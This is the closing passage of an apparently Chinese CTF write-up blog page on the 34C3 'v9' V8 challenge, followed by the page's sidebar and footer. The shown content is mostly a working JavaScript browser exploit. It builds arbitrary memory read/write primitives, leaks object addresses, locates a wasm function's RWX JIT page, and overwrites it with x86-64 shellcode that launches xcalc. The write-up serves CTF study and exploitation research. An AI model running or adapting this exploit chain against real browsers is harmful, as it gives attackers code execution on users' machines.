class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line">victim.offset16 = memviewBuf;</span><br><span class="line"><span class="comment">//%DebugPrint(victim);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//obj = &#123;x : 1&#125;;</span></span><br><span class="line"><span class="comment">//driverBuf.leakobj = obj;</span></span><br><span class="line"><span class="comment">//%DebugPrint(driverBuf);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> driver = <span class="keyword">new</span> <span class="built_in">DataView</span>(driverBuf);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	read(addr)</span><br><span class="line">	&#123;</span><br><span class="line">		driver.setFloat64(<span class="number">31</span>, tC.u2f(addr), <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">var</span> memView = <span class="keyword">new</span> <span class="built_in">DataView</span>(memviewBuf);</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(memView.getFloat64(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, payload)</span><br><span class="line">	&#123;</span><br><span class="line">		driver.setFloat64(<span class="number">31</span>, tC.u2f(addr), <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">var</span> memView = <span class="keyword">new</span> <span class="built_in">DataView</span>(memviewBuf);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;payload.length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			memView.setUint8(i, payload[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	leakObjF(objInput)</span><br><span class="line">	&#123;</span><br><span class="line">		driverBuf.leakobj = objInput;</span><br><span class="line">		<span class="comment">//%DebugPrint(objInput);</span></span><br><span class="line">		<span class="comment">//%DebugPrint(driverBuf);</span></span><br><span class="line">		<span class="comment">//%SystemBreak();</span></span><br><span class="line">		<span class="keyword">let</span> propertiesAddr = <span class="keyword">this</span>.read(bufAddr - <span class="number">0x1</span> + <span class="number">0x8</span>);</span><br><span class="line">		<span class="keyword">let</span> objAddr = <span class="keyword">this</span>.read(propertiesAddr - <span class="number">0x1</span> + <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> objAddr;</span><br><span class="line">	&#125;</span><br><span class="line">	leakObj(obj)</span><br><span class="line">	&#123;</span><br><span class="line">		driverBuf.leakobj = obj;</span><br><span class="line">		<span class="keyword">let</span> mapAddr = <span class="keyword">this</span>.read(bufAddr<span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">let</span> instanceDescriptorsAddr = <span class="keyword">this</span>.read(mapAddr - <span class="number">0x1</span> + <span class="number">0x30</span>);</span><br><span class="line">		<span class="keyword">let</span> objAddr = <span class="keyword">this</span>.read(instanceDescriptorsAddr - <span class="number">0x1</span> + <span class="number">0x30</span>);</span><br><span class="line">		<span class="keyword">return</span> objAddr;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wr = <span class="keyword">new</span> ArbitraryRW();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasmFuncAddr = wr.leakObj(wasmFunc);</span><br><span class="line">success(<span class="string">"wasmFuncAddr"</span>,wasmFuncAddr);</span><br><span class="line"><span class="comment">//%DebugPrint(wasmFunc);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="keyword">let</span> rwxJITAddr = wr.read(wasmFuncAddr - <span class="number">0x1</span> + <span class="number">0x38</span>) - <span class="number">0x1</span> + <span class="number">0x60</span>;</span><br><span class="line">success(<span class="string">"rwxJITAddr"</span>,rwxJITAddr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCalc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">let</span> shellcode = [<span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x90</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x78</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0xc7</span>, <span class="number">0xc0</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x00</span>];</span><br><span class="line">	wr.write(rwxJITAddr,shellcode);</span><br><span class="line">	wasmFunc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">showCalc()</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/31/34c3-v9/000.png" alt="000"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/ray-cp/browser_pwn/blob/master/34c3ctf-v9/exp.js" target="_blank" rel="noopener">raycp师傅的exploit</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/exploit/" rel="tag"># exploit</a>
+          
+            <a href="/tags/Browser/" rel="tag"># Browser</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/05/17/QWB-CTF-2019-growupjs/" rel="next" title="QWB CTF 2019 growupjs">
+                <i class="fa fa-chevron-left"></i> QWB CTF 2019 growupjs
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2099/01/01/Diary/" rel="prev" title="Diary">
+                Diary <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/header.jpg" alt="Eros John">
+            
+              <p class="site-author-name" itemprop="name">Eros John</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/erosjohn" title="GitHub &rarr; https://github.com/erosjohn" rel="noopener" target="_blank"><i class="fa fa-fw fa-globe"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#环境准备"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Patch"><span class="nav-number">2.1.</span> <span class="nav-text">Patch</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC"><span class="nav-number">2.2.</span> <span class="nav-text">POC</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#addrOf原语"><span class="nav-number">3.1.</span> <span class="nav-text">addrOf原语</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修改Properties"><span class="nav-number">3.2.</span> <span class="nav-text">修改Properties</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#任意地址读写"><span class="nav-number">3.3.</span> <span class="nav-text">任意地址读写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RWX地址"><span class="nav-number">3.4.</span> <span class="nav-text">RWX地址</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.5.</span> <span class="nav-text">Exploit</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">4.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Eros John</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.0"></script>
+
+  <script src="/js/motion.js?v=7.1.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.0"></script>
+<script src="/js/post-details.js?v=7.1.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
